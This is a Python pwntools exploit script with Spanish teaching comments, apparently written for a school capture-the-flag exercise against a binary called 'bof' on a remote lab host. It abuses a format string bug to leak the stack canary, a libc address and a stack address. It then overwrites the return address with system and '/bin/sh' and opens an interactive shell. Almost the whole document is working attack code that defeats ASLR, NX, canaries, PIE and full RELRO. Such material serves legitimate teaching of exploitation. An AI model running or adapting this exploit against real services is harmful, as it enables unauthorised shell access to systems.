#!/usr/bin/python3
########################################################################
# Ejecuta checksec ./bof
# Observa que todas las protecciones están acticadas.
########################################################################
# En este ejercicio tenemos una única vulnerabilidad.
# String Format Bug SFB
# El Strinf Format Bug consiste en un printf en el que la cadena de formato
# es controlada por el usuario.
# De esta forma se puede hacer un leak de memoria o incluso una escritura
# aleatoria en memoria.
#
#
# Además si haces un checksec verás que se han activado todas las protecciones
# ASLR activado: Aleatoriza la memoria excepto el binario.
# NX Enabled: La pila no es ejecutable. No podemos inyectar una shellcode.
# Canary: Es un valor que se inserta antes de EBP y RET en la pila. 
#         Antes de ejecutar leave y ret se comprueba su valor. Si ha cambiado
#         se aborta la ejecución del programa.
# PIE:    Aleatoriza las direcciones de memoria del binario.
# RELRO:  Full Hace que la GOT sea de solo lectura. Antes de la ejecución
#         se resuelven todas las funciones de libc.          
#
########################################################################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10012

gs = '''
b start_level
continue
'''
def start():
    """
    Si ejecutamos:$ xpl.py sin parámetros io.sendXXX para enviar datos por entrada estandar al proceso. io.recXXX para leer datos salida estandar del proceso.
    Si ejecutamos:$ xpl.py GDB se abre una nueva ventana con el depurador
    Si ejecutamos:$ xpl.py REMOTE se abre un socket con servidor remoto. La entrada y salida funciona igual que en local.
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)


io = start()

#Hacemos un leak de la pila para robar el canario.
#Miramos con gdb donde está el canario ebp-0xc
print(io.recvuntil(": "))
io.sendline("%15$p")
io.recvline()
leak = io.recvline()
canary = int(leak,16)
log.info("Canary: " + hex(canary))

#Hacemos un segundo leak de la pila para robar alguna dirección de libc.
#En gdb se buscan direcciones dentro de libc. Después se calcula el offset.
#p leak - libc.base
#Necesitamos robar la direccion de libc ya que ASRL está activado. 
#Si se desactiva no es necesario el leak.
####
# Se puede hacer el leak de una sola vez ¿Como?
####
io.recvuntil(": ")
io.sendline("%16$p")
io.recvline()
leak = io.recvline()
libc.address = int(leak, 16) - 2294512
log.info("libc.address: " + hex(libc.address))


#Hacemos un tercer leak de la pila para robar dirección de la pila.
#Calculo el offset de la dirección robada al valor del registro EBP. Así 
#sabemos donde está ret en la pila.
io.recvuntil(": ")
io.sendline("%18$p")
io.recvline()
leak = io.recvline()
leak_stack = int(leak, 16) - 16 # Calculado en gdb. p direccion_robada - EBP
log.info("Stack: " + hex(leak_stack))



#No podemos desbordar el buffer!!!!
#Pero printf permite escrituras en memoria arbitrarias!!!!!
#Es tedioso hacerlo a mano. Pwntools nos ayuda.

print(hex(leak_stack + 8))
print(hex(libc.sym['system']))
io.recvuntil(": ")
writes = {leak_stack + 4: libc.sym['system']}
payload = fmtstr_payload(5, writes, write_size='short', numbwritten=0)
print(payload)
print(len(payload))
io.sendline(payload)


io.recvuntil(": ")
writes = {leak_stack + 12: next(libc.search(b'/bin/sh'))}
payload = fmtstr_payload(5, writes, write_size='short', numbwritten=0)
print(payload)
print(len(payload))
io.sendline(payload)
io.recvuntil(": ")
io.sendline("X")

#Hacemos la sesión interactiva (entrada y salida estandar)
io.interactive()
